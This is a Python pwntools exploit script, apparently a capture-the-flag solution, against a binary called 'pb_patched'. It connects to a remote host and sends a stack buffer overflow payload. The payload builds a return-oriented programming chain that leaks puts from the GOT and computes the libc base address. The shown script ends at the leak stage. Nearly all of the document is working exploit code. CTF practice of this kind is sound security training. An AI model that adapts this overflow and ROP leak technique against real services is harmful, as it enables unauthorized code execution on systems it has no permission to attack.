from pwn import *

exe = ELF("./pb_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "178.62.64.13"
remote_port = 32229
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()

pop_rdi = 0x000000000040142b
pop_rsi_r15 = 0x0000000000401429
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']

payload = b'a'*0x30 + p64(exe.bss()+0x200)
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(exe.symbols['box'])
r.sendline(b'2')
r.sendline(payload)
r.recvuntil(b'you!\n')
r.recvline()
leaked_puts = u64(r.recv(6).ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')
